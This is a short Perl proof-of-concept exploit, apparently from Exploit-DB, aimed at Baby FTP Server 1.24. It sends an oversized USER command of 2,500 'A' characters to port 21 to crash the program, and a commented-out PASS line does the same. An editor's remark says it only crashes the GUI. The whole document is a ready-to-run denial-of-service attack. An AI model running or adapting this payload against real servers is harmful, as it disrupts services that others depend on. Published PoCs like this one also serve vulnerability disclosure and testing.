#!/usr/bin/perl
#
# Note from Exploit-DB (thanks @wireghoul): This PoC only crashes the GUI for the application, 
# not the server itself.
#
###################################################################
#
# Exploit Title: Baby FTP Server Version 1.24 Denial Of Service
# Date: 2013/6/25
# Exploit Author: Chako
# Vendor Homepage: http://www.pablosoftwaresolutions.com/html/baby_ftp_server.html
# Software Download Link: http://www.pablosoftwaresolutions.com/files/babyftp.zip
# Version: 1.24
# Tested on: Windows 7
# Description:
#       A bug discovered  in Baby FTP Server Version 1.24 allows an attacker
#       to cause a Denial of Service using a specially crafted request(USER, PASS...etc).
#
################################################################### 
use IO::Socket;
 
$TARGET = "127.0.0.1";
$PORT   = 21;
$JUNK = "\x41" x 2500;
 
$PAYLOAD = "USER ".$JUNK."\r\n";
#$PAYLOAD = "PASS ".$JUNK."\r\n";

 
$SOCKET = IO::Socket::INET->new(Proto=>'TCP', 
                                PeerHost=>$TARGET, 
								PeerPort=>$PORT) or die "Error: $TARGET :$PORT\n";
 
$SOCKET->send($PAYLOAD);
 
close($SOCKET);